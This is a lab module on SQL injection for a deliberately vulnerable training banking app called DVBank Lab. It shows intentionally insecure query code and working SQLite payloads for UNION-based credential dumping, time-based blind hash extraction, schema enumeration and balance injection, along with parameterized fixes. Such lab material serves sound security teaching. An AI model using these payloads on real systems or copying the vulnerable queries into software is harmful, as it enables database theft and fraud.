# Module 4: SQL Injection Vulnerabilities

## Understanding SQL Injection

SQL Injection (SQLi) is a critical web security vulnerability that allows attackers to manipulate database queries by injecting malicious SQL code through application inputs. In banking applications, this vulnerability can be particularly devastating, potentially leading to unauthorized access, data theft, and financial fraud.

### How SQL Injection Works

When an application builds SQL queries by concatenating strings with user input, it becomes vulnerable to SQL injection. Consider this simple example:

```python
# Vulnerable query construction
username = "alice"
query = f"SELECT * FROM user WHERE username = '{username}'"
# Results in: SELECT * FROM user WHERE username = 'alice'

# What happens with malicious input?
username = "' OR '1'='1"
query = f"SELECT * FROM user WHERE username = '{username}'"
# Results in: SELECT * FROM user WHERE username = '' OR '1'='1'
```

The attacker's input changes the query's logic from "find user named alice" to "find any user because 1=1 is always true".

### Types of SQL Injection (on this lab)

DVBank Lab runs on **SQLite** via Python's `sqlite3` driver. That constrains which techniques work:

- `cursor.execute()` runs **one statement only** — stacked queries (`'; UPDATE ...--`, `'; DROP ...--`) are a no-op.
- There is **no** `@@version`, `SLEEP()`, or `WAITFOR` — those are MySQL/MSSQL and will error.
- Tables are lowercase `user` and `transaction`; a `UNION` must match the base query's **column count**.

The usable classes here are:

1. **In-band (UNION-based)** — append a `UNION SELECT` with a matching column count to read other tables:
   ```sql
   ' UNION SELECT username, password_hash FROM user--
   ```
2. **Inferential (Blind)** — when results aren't echoed back, infer data one bit at a time:
   - **Boolean-based**: observe whether a row comes back / a request succeeds.
     ```sql
     ' AND (SELECT CASE WHEN (username='admin') THEN 1 ELSE 0 END)=1--
     ```
   - **Time-based**: force a measurable delay with SQLite's `randomblob()`:
     ```sql
     ' AND (SELECT CASE WHEN substr(password_hash,1,1)='a'
         THEN randomblob(100000000) ELSE randomblob(1) END FROM user LIMIT 1)--
     ```

### SQLite-Specific Techniques

- **Enumerate schema** via `sqlite_master`:
  ```sql
  ' UNION SELECT name, sql FROM sqlite_master WHERE type='table'--
  ```
- **Extract one character at a time** with `substr()` for blind attacks:
  ```sql
  ' AND substr((SELECT password_hash FROM user LIMIT 1),1,1)='a'--
  ```

> 💡 **Stacked queries do not work here.** Payloads like `'; UPDATE user SET balance=...--`,
> `'; DELETE FROM ...--`, or `'; DROP TABLE ...--` are no-ops on `sqlite3` because
> `execute()` only runs the first statement. `INSERT`/`UPDATE`/`DELETE` injection is only
> reachable where the application's *own* query is already an `INSERT`/`UPDATE` (see
> Registration below) — never by chaining a second statement.

## Overview

SQL Injection vulnerabilities in DVBank Lab exist in multiple critical endpoints, including user authentication, registration, and transaction processing. This module examines these vulnerabilities and their potential impact on banking operations.

## Vulnerable Endpoints

### 1. User Login
**Location**: `backend/routes/auth_routes.py`
```python
# Vulnerable: Direct string interpolation in login query
query = f"SELECT * FROM user WHERE username = '{username}'"
user = db.session.execute(query).fetchone()

# The result is then gated on the password:
#   if user and User.query.get(user[0]).check_password(password):
# On success it returns ONLY a token + {id, username, balance}.
```

> 🤔 **Challenge Note**: 
> Traditional SQL injection techniques like `' OR '1'='1` or `UNION` attacks won't work directly here. Why?
> - The application checks the password hash after the query
> - Simple authentication bypass is prevented by additional logic
> - Direct data extraction through UNION is not possible due to the application's response behavior
>
> **Your Challenge**:
> 1. Study the application's behavior carefully
> 2. Think about what information you can gather from login success/failure
> 3. Consider how timing attacks might help
> 4. Can you extract data without seeing it directly?

**Attack Vectors** (blind / time-based only — see Challenge Note):

The query result is gated by `check_password()`, and the endpoint returns only a token plus
`id`/`username`/`balance`. So `' OR '1'='1' --` and `UNION` neither authenticate nor echo any
data. The only usable channel is **timing**, using SQLite's `randomblob()` (there is no
`SLEEP`/`WAITFOR` on `sqlite3`):

```sql
-- Time-based extraction: a long delay means the guessed character is correct
username: admin' AND (SELECT CASE
    WHEN substr(password_hash,1,1)='a'
    THEN randomblob(100000000) ELSE randomblob(1) END
    FROM user WHERE username='admin')--
password: anything
```

Iterate the character value and position to recover the hash one byte at a time.

**Real-World Impact**:
- Password hashes (unsalted MD5) and balances can be extracted bit-by-bit via timing, then cracked offline
- Every attempt — success or failure — is recorded in `LoginAttempt` (`auth_routes.py:52-59`, `77-84`), so this activity is logged, not trace-free

> 💡 **Hints for the Challenge**:
> 1. Think about boolean logic:
>    - What happens when your SQL condition is TRUE vs FALSE?
>    - How can you use this to confirm if a user exists?
> 
> 2. Consider timing attacks:
>    - SQLite's `randomblob()` function can create deliberate delays
>    - How can you use delays to extract information?
>
> 3. Data extraction strategy:
>    - Break down what you want to know into yes/no questions
>    - Use binary search to reduce the number of requests needed
>    - Think about how to extract data one character at a time
>
> 4. Advanced techniques:
>    - Can you combine boolean and timing attacks?
>    - How might you automate this process?
>    - What tools could help you measure response times accurately?

### 2. User Registration
**Location**: `backend/routes/auth_routes.py`
```python
# Vulnerable: String concatenation in registration
insert_query = f"INSERT INTO user (username, password_hash, balance) VALUES ('{username}', '{password_hash}', 0000.00)"
db.session.execute(insert_query)
```

**Attack Vectors**:
```sql
-- Inject a row with an attacker-chosen balance (the INSERT itself runs)
username: hacker', 'hash', 1000000) --
password: anything
```

> 🤔 **Reality check**: This `INSERT` *does* execute and write the row, but the handler then
> runs `User.query.filter_by(username=username).first()` (`auth_routes.py:26-28`) using the
> full injected string as the username — which does not match the `hacker` row it just
> created — so `user.id` dereferences `None` and the request returns a 500. The malicious
> row is still persisted.
>
> There is **no** "modify another user" vector here: this is an `INSERT`, which can only add
> rows. A multi-row payload targeting an existing user (e.g. `alice`) hits the
> `UNIQUE(username)` constraint and the whole statement aborts.

### 3. Transaction Processing
**Location**: `backend/routes/transaction_routes.py`
```python
# Vulnerable: ?user_id= is interpolated TWICE, unparameterized
user_id = request.args.get('user_id', current_user.id)
query = f'SELECT * FROM "Transaction" WHERE sender_id = {user_id} OR receiver_id = {user_id} ORDER BY created_at DESC'
transactions = db.session.execute(query).fetchall()
```

**Attack Vectors** (via the `?user_id=` query parameter):
```sql
-- View every transaction (filter is always true)
?user_id=0 OR 1=1

-- UNION to dump credentials from the user table.
-- SELECT * FROM "Transaction" returns 8 columns, so the UNION must supply 8.
-- Because user_id is interpolated TWICE, a trailing comment is required to kill
-- the second "OR receiver_id = ..." clause:
?user_id=0 UNION SELECT id,username,password_hash,balance,role,'x','x','x' FROM user-- 
```

> 💡 Note there is no working `; UPDATE ...` here — stacked statements don't run on `sqlite3`.

### 4. Transaction Search
**Location**: `backend/routes/transaction_routes.py`
```python
@transaction_bp.route('/api/transactions/search', methods=['GET'])
@token_required
def search_transactions(current_user):
    search_term = request.args.get('description', '')
    
    # VULNERABLE CODE: Direct string concatenation in SQL query
    # This is deliberately vulnerable to SQL injection for educational purposes
    query = f"SELECT * FROM \"transaction\" WHERE (sender_id = {current_user.id} OR receiver_id = {current_user.id}) AND description LIKE '%{search_term}%'"
    
    result = db.session.execute(query)
    transactions = result.fetchall()
    
    transaction_list = []
    for t in transactions:
        transaction_list.append({
            'id': t[0],
            'sender_id': t[1],
            'receiver_id': t[2], 
            'amount': float(t[3]),
            'description': t[4],
            'status': t[5],
            'created_at': t[6],
            'completed_at': t[7]
        })
    
    return jsonify(transaction_list)
```

**Attack Vectors** (via the `?description=` query parameter; the term is wrapped in `'%...%'`):
```sql
-- NO-OP: a bare ' OR '1'='1 (or '; --) does NOT widen access here. AND binds tighter
-- than OR, and the trailing %' makes the OR clause '1'='1%' false, so you stay scoped
-- to your own rows. You must close the LIKE string and comment out the trailing %':

-- Bypass the user filter (see every user's transactions)
%' OR '1'='1' -- 

-- UNION to dump credentials (8 columns to match SELECT * FROM "transaction")
%' UNION SELECT id, username, password_hash, 1.0, username, 'x', 'x', 'x' FROM user -- 

-- Enumerate the database schema
%' UNION SELECT name, sql, 1, 1.0, 'x', 'x', 'x', 'x' FROM sqlite_master WHERE type='table' -- 
```

**Impact**:
- Exposure of transactions from other users
- Access to sensitive financial data
- Potential extraction of the entire database schema

**Secure Alternative**:
```python
# SAFE VERSION:
search_term = request.args.get('description', '')
query = "SELECT * FROM transaction WHERE (sender_id = :user_id OR receiver_id = :user_id) AND description LIKE :term"
result = db.session.execute(query, {
    "user_id": current_user.id,
    "term": f"%{search_term}%"
})
```

## Impact Analysis

### Authentication Bypass Impact
- Unauthorized account access
- Identity theft
- Account takeover
- Privilege escalation

### Registration Manipulation Impact
- Creation of unauthorized accounts
- Balance manipulation
- Database corruption
- System compromise

### Transaction Attack Impact
- Unauthorized fund transfers
- Transaction history manipulation
- Financial fraud
- Audit trail tampering

## Detection Techniques

### 1. Manual Testing
This lab is SQLite — probe accordingly (no `@@version`, `SLEEP()`, or `WAITFOR`):
```sql
-- Error-based: a lone single quote forces a syntax error (confirms injection)
'

-- Boolean: compare a true vs a false condition and watch the response differ
' OR '1'='1' --      -- (close the string / comment as the surrounding context requires)
' OR '1'='2' --

-- Time-based: randomblob() is SQLite's delay primitive
' AND randomblob(100000000) --
' AND (SELECT CASE WHEN (1=1) THEN randomblob(100000000) ELSE randomblob(1) END) --
```

### 2. Automated Testing
Use tools like:
- SQLmap with identified endpoints
- OWASP ZAP SQL Injection scanner
- Burp Suite's scanner

## Prevention Methods

### 1. Use Parameterized Queries
```python
# Safe login query
query = "SELECT * FROM user WHERE username = :username"
user = db.session.execute(query, {'username': username}).fetchone()

# Safe registration
query = "INSERT INTO user (username, password_hash, balance) VALUES (:username, :password_hash, :balance)"
db.session.execute(query, {
    'username': username,
    'password_hash': password_hash,
    'balance': 0
})

# Safe transaction query
query = 'SELECT * FROM "Transaction" WHERE sender_id = :user_id OR receiver_id = :user_id ORDER BY created_at DESC'
transactions = db.session.execute(query, {'user_id': user_id}).fetchall()
```

### 2. Input Validation
```python
def validate_username(username):
    if not isinstance(username, str):
        return False
    if not username.isalnum():
        return False
    if len(username) > 30:
        return False
    return True

def validate_transaction_id(id):
    try:
        id = int(id)
        return id > 0
    except ValueError:
        return False
```

### 3. Use ORM
```python
# Using SQLAlchemy ORM
user = User.query.filter_by(username=username).first()
transaction = Transaction.query.get(transaction_id)
```

## Exercises

1. **Authentication Bypass**
   - Try logging in with a single quote (') to trigger SQL errors and expose database details
   - Extract user credentials using time-based blind attacks (e.g. CASE WHEN with randomblob)
   - Use sqlmap to automatically dump usernames and password hashes from the database
   - Implement proper parameterization

2. **Registration Exploitation**
   - Create a user with a manipulated balance and confirm the row is written despite the 500
   - Explain why an INSERT cannot modify an existing user's row
   - Fix the registration endpoint

3. **Transaction Analysis**
   - Extract all transactions using injection via `?user_id=`
   - Extract all usernames and password hashes using an 8-column UNION
   - Implement secure transaction queries

4. **Transaction Search Exploitation**
   - Confirm that a bare `' OR '1'='1` is a no-op, then bypass the filter with `%' OR '1'='1' -- `
   - Use an 8-column UNION to extract other users' credentials
   - Use UNION against `sqlite_master` to extract schema information
   - Implement a secure parameterized version and compare it to the vulnerable one

## Additional Resources

1. [OWASP SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)
2. [CWE-89: SQL Injection](https://cwe.mitre.org/data/definitions/89.html)
3. [PortSwigger SQL Injection Guide](https://portswigger.net/web-security/sql-injection)

⚠️ **Remember**: These vulnerabilities are intentional for learning. Never implement such code in production environments. 
